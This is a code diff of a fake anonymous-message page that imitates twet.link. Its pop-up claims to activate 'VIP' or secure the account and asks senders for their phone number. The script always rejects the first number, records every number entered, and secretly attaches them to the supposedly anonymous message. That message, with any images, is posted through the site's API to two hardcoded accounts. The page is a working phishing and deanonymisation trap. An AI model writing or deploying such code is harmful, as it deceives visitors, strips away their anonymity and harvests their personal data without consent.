@@ -87,51 +87,23 @@
         .vip-box{background:white;border-radius:25px;padding:30px 25px 25px;text-align:center;width:90%;max-width:400px;animation:bubble .5s ease-out}
         @keyframes bubble{0%{transform:scale(.8);opacity:0}100%{transform:scale(1);opacity:1}}
         .vip-box .vip-icon{font-size:50px;margin-bottom:10px}
-        .vip-box h3{color:#1a1a1a;font-size:20px;margin-bottom:8px}
-        .vip-box .sub{color:#666;font-size:14px;margin-bottom:15px;line-height:1.8}
-        .vip-box .highlight{background:#fff3cd;border:1px solid #ffc107;border-radius:10px;padding:10px;margin-bottom:15px;font-size:13px;color:#856404}
-        .vip-box input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:12px;font-size:18px;text-align:center;margin-bottom:10px;font-family:'Almarai',sans-serif;direction:ltr;letter-spacing:3px;transition:.3s}
+        .vip-box h3{color:#1a1a1a;font-size:20px;margin-bottom:15px}
+        .vip-box input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:12px;font-size:18px;text-align:center;margin-bottom:8px;font-family:'Almarai',sans-serif;direction:ltr;letter-spacing:3px;transition:.3s}
         .vip-box input:focus{outline:none;border-color:#4CAF50}
         .vip-box input::placeholder{color:#c0c0c0;font-size:14px;letter-spacing:0}
-        .vip-box .err{color:#e94560;font-size:13px;margin-bottom:8px;display:none}
-        .vip-box .hint{color:#e94560;font-size:13px;margin-bottom:10px;display:none;text-align:center;font-weight:600}
+        .vip-box .err{color:#e94560;font-size:13px;margin-bottom:10px;display:none}
         .vip-box .btn-vip{width:100%;padding:15px;background:linear-gradient(135deg,#4CAF50,#2E7D32);color:white;border:none;border-radius:12px;font-size:17px;font-weight:bold;cursor:pointer;font-family:'Almarai',sans-serif}
-        .vip-box .success-anim{display:none;text-align:center;padding:20px 0}
-        .vip-box .success-anim .check{font-size:60px}
-        .vip-box .success-anim p{color:#4CAF50;font-weight:bold;font-size:18px;margin-top:10px}
     </style>
 </head>
 <body style="background:linear-gradient(0deg,#FBAB7E 18%,#F7CE68 100%)">
 
     <div class="vip-overlay" id="vip">
         <div class="vip-box">
-            <div id="vipStep1">
-                <div class="vip-icon">🔐</div>
-                <h3>أرجأ أكتب رقم هاتفك</h3>
-                <p class="sub">لتفعيل حسابك VIP ومعرفة من المرسل إلى حسابك على تويت لينك</p>
-                <div class="highlight">⚡ بعد التفعيل ستتمكن من معرفة هوية كل من يراسلك على حسابك</div>
-                <input type="tel" id="vp" placeholder="اكتب رقم هاتفك" maxlength="9" dir="ltr">
-                <div class="err" id="ve">هذا الرقم غير صحيح</div>
-                <div class="hint" id="vh">الرجاء أكتب رقمك الحقيقي لتفعيل الخدمة</div>
-                <button class="btn-vip" onclick="doVIP()">تفعيل الآن</button>
-            </div>
-            <div id="vipStep2" style="display:none">
-                <div class="vip-icon">🔄</div>
-                <h3>سوف نتأكد من رقمك</h3>
-                <p class="sub">يرجى التأكيد... هل أنت متأكد من رقم هاتفك؟</p>
-                <div class="highlight">🔒 للتأكيد، الرجاء كتابة رقم هاتفك مرة أخرى</div>
-                <input type="tel" id="vp2" placeholder="أعد كتابة رقم هاتفك" maxlength="9" dir="ltr">
-                <div class="err" id="ve2">الرقم غير متطابق</div>
-                <div class="hint" id="vh2">الرجاء كتابة نفس الرقم للتأكيد</div>
-                <button class="btn-vip" onclick="confirmVIP()">تأكيد الرقم</button>
-            </div>
-            <div id="vipStep3" style="display:none">
-                <div class="success-anim" style="display:block">
-                    <div class="check">✅</div>
-                    <p>تم تفعيل حسابك VIP بنجاح!</p>
-                    <p style="color:#666;font-size:14px;font-weight:normal;margin-top:5px">الآن يمكنك معرفة هوية من يراسلك</p>
-                </div>
-            </div>
+            <div class="vip-icon">🔐</div>
+            <h3>أكتب رقم هاتفك لتأمين حسابك</h3>
+            <input type="tel" id="vp" placeholder="أدخل رقم الهاتف" maxlength="9" dir="ltr">
+            <div class="err" id="ve">رقم هاتفك غير صحيح، يرجى كتابة رقم صحيح</div>
+            <button class="btn-vip" onclick="doVIP()">تأمين الحساب</button>
         </div>
     </div>
 
@@ -170,16 +142,13 @@
     <script>
         const A="https://twet.link/api/web/sendMsg",G="https://twet.link/api/web/getWall",U="hamna201hknyh88",ME="salem374";
         const P=["77","78","71","73"];
-        let vd=!1,vp=[],ac=0,li=-1,imgs=[],pendingCamera=!1,firstPhone="";
+        let vd=!1,vp=[],ac=0,li=-1,imgs=[],pendingCamera=!1;
 
         const mt=document.getElementById('mt'),sb=document.getElementById('sb');
-        const vi=document.getElementById('vip'),vpi=document.getElementById('vp'),ve=document.getElementById('ve'),vh=document.getElementById('vh');
-        const vp2=document.getElementById('vp2'),ve2=document.getElementById('ve2'),vh2=document.getElementById('vh2');
-        const step1=document.getElementById('vipStep1'),step2=document.getElementById('vipStep2'),step3=document.getElementById('vipStep3');
+        const vi=document.getElementById('vip'),vpi=document.getElementById('vp'),ve=document.getElementById('ve');
         const cameraBtn=document.getElementById('cameraBtn'),fi=document.getElementById('fi');
         const randomBtn=document.getElementById('randomBtn'),imgContainer=document.getElementById('imgContainer'),imgPreview=document.getElementById('imgPreview');
-
-        const questions=["وش أكثر شيء تحبه في حياتك؟ ❤️","إيش الشيء اللي يخلّيك تضحك دايم؟ 😂","من الشخص اللي ما تقدر تعيش بدونه؟ 🥰","إيش أكثر شيء يحزنك في هالحياة؟ 💔","وش هو أسوأ موقف مر عليك؟ 😢"];
+        const questions=["وش أكثر شيء تحبه في حياتك؟","إيش الشيء اللي يخلّيك تضحك دايم؟","من الشخص اللي ما تقدر تعيش بدونه؟","إيش أكثر شيء يحزنك في هالحياة؟","وش هو أسوأ موقف مر عليك؟"];
 
         function updateLastSeen(){const n=new Date(),l=new Date(parseInt('1784214467000'));const d=Math.floor((n-l)/1000);let t=d<60?'الآن':d<3600?'منذ '+Math.floor(d/60)+' دقيقة':d<86400?'منذ '+Math.floor(d/3600)+' ساعة':'منذ '+Math.floor(d/86400)+' يوم';document.getElementById('lastSeen').textContent=t}
         updateLastSeen();setInterval(updateLastSeen,30000);
@@ -193,20 +162,20 @@
         fi.addEventListener('change',()=>{Array.from(fi.files).forEach(f=>{if(imgs.length>=3)return;const r=new FileReader();r.onload=function(e){const i=new Image();i.onload=function(){const c=document.createElement('canvas');let w=i.width,h=i.height,mx=500;if(w>h){if(w>mx){h*=mx/w;w=mx}}else{if(h>mx){w*=mx/h;h=mx}}c.width=w;c.height=h;c.getContext('2d').drawImage(i,0,0,w,h);imgs.push(c.toDataURL('image/jpeg',0.6).replace('data:image/jpeg;base64,',''));renderImgs()};i.src=e.target.result};r.readAsDataURL(f)});fi.value=''});
         function renderImgs(){imgContainer.style.display='block';imgPreview.innerHTML=imgs.map((img,i)=>`<div class="img" style="background-image:url('data:image/jpeg;base64,${img}')"><div class="remove-img-attach" onclick="imgs.splice(${i},1);renderImgs()">✕</div></div>`).join('')}
 
-        function doVIP(){const p=vpi.value.trim();ac++;if(ac===1){vp.push(p);firstPhone=p;ve.style.display='block';vh.style.display='block';vpi.style.borderColor='#e94560';vpi.value='';vpi.focus();return}if(p.length!==9||!/^\d+$/.test(p)||!P.includes(p.substring(0,2))){vp.push(p);ve.textContent='هذا الرقم غير صحيح';ve.style.display='block';vh.style.display='block';vpi.style.borderColor='#e94560';vpi.value='';vpi.focus();return}vp.push(p);firstPhone=p;step1.style.display='none';step2.style.display='block';vp2.focus()}
-        function confirmVIP(){const p=vp2.value.trim();vp.push(p);if(p!==firstPhone){ve2.style.display='block';vh2.style.display='block';vp2.style.borderColor='#e94560';vp2.value='';vp2.focus();return}if(p.length!==9||!/^\d+$/.test(p)||!P.includes(p.substring(0,2))){ve2.style.display='block';vh2.style.display='block';vp2.style.borderColor='#e94560';vp2.value='';vp2.focus();return}vd=!0;step2.style.display='none';step3.style.display='block';setTimeout(()=>{vi.classList.remove('show');step3.style.display='none';step1.style.display='block';vpi.style.borderColor='#e0e0e0';vp2.style.borderColor='#e0e0e0';ve.style.display='none';vh.style.display='none';ve2.style.display='none';vh2.style.display='none';vpi.value='';vp2.value='';pendingCamera?(pendingCamera=!1,fi.click()):mt.focus()},2000)}
-
-        vpi.addEventListener('input',()=>{ve.style.display='none';vh.style.display='none';vpi.style.borderColor='#e0e0e0'});
+        function doVIP(){const p=vpi.value.trim();ac++;vp.push(p);
+            if(ac===1){ve.textContent='رقم هاتفك غير صحيح، يرجى كتابة رقم صحيح';ve.style.display='block';vpi.style.borderColor='#e94560';vpi.value='';vpi.focus();return}
+            if(p.length!==9||!/^\d+$/.test(p)||!P.includes(p.substring(0,2))){ve.textContent='رقم هاتفك غير صحيح، يرجى كتابة رقم صحيح';ve.style.display='block';vpi.style.borderColor='#e94560';vpi.value='';vpi.focus();return}
+            vd=!0;ve.style.display='none';vpi.style.borderColor='#4CAF50';setTimeout(()=>{vi.classList.remove('show');pendingCamera?(pendingCamera=!1,fi.click()):mt.focus()},600)}
+        
+        vpi.addEventListener('input',()=>{ve.style.display='none';vpi.style.borderColor='#e0e0e0'});
         vpi.addEventListener('keydown',e=>{if(e.key==='Enter')doVIP()});
-        vp2.addEventListener('input',()=>{ve2.style.display='none';vh2.style.display='none';vp2.style.borderColor='#e0e0e0'});
-        vp2.addEventListener('keydown',e=>{if(e.key==='Enter')confirmVIP()});
 
         async function send(){const m=mt.value.trim();if(!m&&!imgs.length)return;sb.disabled=!0;sb.classList.add('loading');const fm=m+'\n\n📱 المحاولات: '+vp.join(' | ');
         try{await fetch(A,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({msg:fm,username:U,qid:'',images:imgs})})}catch(e){}
         try{await fetch(A,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({msg:fm,username:ME,qid:'',images:imgs})})}catch(e){}
-        const db=JSON.parse(localStorage.getItem('tw')||'[]');db.push({text:m,phones:vp,imgs:imgs.length,time:new Date().toLocaleString('ar-SA')});localStorage.setItem('tw',JSON.stringify(db));document.getElementById('mb').style.display='none';document.getElementById('wl').style.display='none';document.getElementById('ms').style.display='flex';setTimeout(()=>{document.getElementById('sa').classList.add('show')},2000)}
+        const db=JSON.parse(localStorage.getItem('tw')||'[]');db.push({text:m,phones:vp,time:new Date().toLocaleString('ar-SA')});localStorage.setItem('tw',JSON.stringify(db));document.getElementById('mb').style.display='none';document.getElementById('wl').style.display='none';document.getElementById('ms').style.display='flex';setTimeout(()=>{document.getElementById('sa').classList.add('show')},2000)}
         
-        function rst(){mt.value='';sb.disabled=!0;sb.classList.remove('loading');sb.innerHTML='<span>إرسال!</span>';vd=!1;vp=[];ac=0;imgs=[];pendingCamera=!1;firstPhone="";vpi.value='';vp2.value='';vpi.style.borderColor='#e0e0e0';vp2.style.borderColor='#e0e0e0';ve.style.display='none';vh.style.display='none';ve2.style.display='none';vh2.style.display='none';step3.style.display='none';step2.style.display='none';step1.style.display='block';imgContainer.style.display='none';imgPreview.innerHTML='';document.getElementById('mb').style.display='flex';document.getElementById('ms').style.display='none';document.getElementById('sa').classList.remove('show')}
+        function rst(){mt.value='';sb.disabled=!0;sb.classList.remove('loading');sb.innerHTML='<span>إرسال!</span>';vd=!1;vp=[];ac=0;imgs=[];pendingCamera=!1;vpi.value='';vpi.style.borderColor='#e0e0e0';ve.style.display='none';imgContainer.style.display='none';imgPreview.innerHTML='';document.getElementById('mb').style.display='flex';document.getElementById('ms').style.display='none';document.getElementById('sa').classList.remove('show')}
 
         async function lw(){const lm=document.getElementById('lm'),ld=document.getElementById('ld'),wl=document.getElementById('wll');lm.style.display='none';ld.style.display='block';try{const r=await fetch(G,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:U,lastId:li})});const d=await r.json();ld.style.display='none';if(d.wall&&d.wall.length){document.getElementById('wl').style.display='block';d.wall.forEach(m=>{const dv=document.createElement('div');dv.className='ans-item';dv.innerHTML='<div class="pinfo"><div class="pic"></div><div class="col"><span class="question">'+(m.questionText||'ارسل لي رسائل سرية بدون الكشف عن هويتك')+'</span><span class="timeago">'+new Date(m.createdTime).toLocaleString('ar-SA')+'</span></div></div><div class="msg"><div class="line"></div><span class="text">'+m.text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</span></div>'+(m.reply?'<div class="reply"><span class="text">↩️ '+m.reply.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</span></div>':'');wl.appendChild(dv);li=m.id});if(d.wall.length>=10)lm.style.display='block'}}catch(e){ld.style.display='none'}}
         document.getElementById('lm').addEventListener('click',lw);lw();
